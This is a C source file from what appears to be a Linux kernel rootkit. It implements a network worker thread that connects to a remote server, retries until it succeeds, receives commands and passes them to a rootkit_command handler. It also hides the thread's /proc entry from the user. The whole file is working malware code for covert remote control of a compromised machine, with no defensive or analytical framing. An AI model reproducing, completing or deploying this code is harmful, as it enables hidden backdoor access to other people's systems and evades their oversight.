#include "hide_api.h"
#include "network.h"

static bool is_auth = false;
static struct task_struct *network_worker_thread = NULL;

bool is_user_auth(void) {
    return is_auth;
}

int set_user_auth(bool auth) {
    is_auth = auth;
    return is_auth;
}

static bool send_initial_message_with_retries(void) {
    for (int attempts = 0; attempts < MAX_MSG_SEND_OR_RECEIVE_ERROR; attempts++) {
        if (send_to_server(message) == SUCCESS)
            return true;
        msleep(TIMEOUT_BEFORE_RETRY);
    }
    return false;
}

static bool receive_loop(char *recv_buffer) {
    unsigned failure_count = 0, empty_count = 0;

    while (!kthread_should_stop()) {
        // Clear the buffer before receiving
        memset(recv_buffer, 0, RCV_CMD_BUFFER_SIZE);

        if (receive_from_server(recv_buffer, RCV_CMD_BUFFER_SIZE) == -FAILURE) {
            if (++failure_count > MAX_MSG_SEND_OR_RECEIVE_ERROR)
                return false;
            msleep(TIMEOUT_BEFORE_RETRY);
            continue;
        }

        if (recv_buffer[0] == '\0') {
            if (++empty_count > MAX_MSG_SEND_OR_RECEIVE_ERROR)
                return false;
            continue;
        }

        failure_count = empty_count = 0;

        // print the received message
        DBG_MSG("network_worker: received message: %s\n", recv_buffer);

        if (strcmp(recv_buffer, "\n") != 0) {
            response_over_dns = false;
            rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
        }
    }

    return true;
}

static int network_worker(void *data) {
    char *recv_buffer = NULL;
    struct sockaddr_in addr = { 0 };
    unsigned char ip_binary[4] = { 0 };

    if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
        ERR_MSG("network_worker: invalid IPv4 address\n");
        return -FAILURE;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));

    while (!kthread_should_stop()) {
        close_worker_socket();

        if (connect_worker_socket_to_server(&addr) != SUCCESS) {
            msleep(TIMEOUT_BEFORE_RETRY);
            continue;
        }

        if (!send_initial_message_with_retries()) {
            msleep(TIMEOUT_BEFORE_RETRY);
            continue;
        }

        recv_buffer = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
        if (!recv_buffer) {
            ERR_MSG("network_worker: failed to allocate recv_buffer\n");
            break;
        }

        if (!receive_loop(recv_buffer)) {
            kfree(recv_buffer);
            recv_buffer = NULL;
            set_user_auth(false);
            msleep(TIMEOUT_BEFORE_RETRY);
            continue;
        }

        break;
    }

    if (recv_buffer)
        kfree(recv_buffer);

    close_worker_socket();

    return SUCCESS;
}

int start_network_worker(void) {
    if (network_worker_thread && !IS_ERR(network_worker_thread)) {
        ERR_MSG("start_network_worker: thread already running\n");
        return -EBUSY;
    }

    network_worker_thread = kthread_run(network_worker, NULL, NETWORK_WORKER_THREAD_NAME);
    if (IS_ERR(network_worker_thread)) {
        ERR_MSG("start_network_worker: failed to start thread\n");
        return PTR_ERR(network_worker_thread);
    }

    // Hide the thread from the user
    char path[32] = { 0 };
    snprintf(path, sizeof(path), "/proc/%d", network_worker_thread->pid);
    hide_file(path);

    return SUCCESS;
}

int stop_network_worker(void) {
    if (!network_worker_thread || IS_ERR(network_worker_thread)) {
        return -EINVAL;
    }

    // Remove the hidden directory associated with the thread
    char path[32] = { 0 };
    snprintf(path, sizeof(path), "/proc/%d", network_worker_thread->pid);
    unhide_file(path);

    // Stop the network worker thread
    kthread_stop(network_worker_thread);
    network_worker_thread = NULL;

    return SUCCESS;
}